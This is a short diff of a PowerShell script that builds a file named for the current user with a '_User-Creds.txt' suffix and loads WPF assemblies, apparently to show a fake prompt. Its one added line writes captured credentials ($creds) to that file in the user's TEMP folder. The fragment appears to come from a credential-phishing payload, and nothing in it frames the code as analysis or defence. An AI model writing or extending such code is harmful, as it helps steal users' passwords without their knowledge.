@@ -1,5 +1,5 @@
 $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
-
+$creds | Out-File -FilePath "$env:TEMP\$fileName" -Encoding utf8
 Add-Type -AssemblyName PresentationCore, PresentationFramework, WindowsBase
 
 
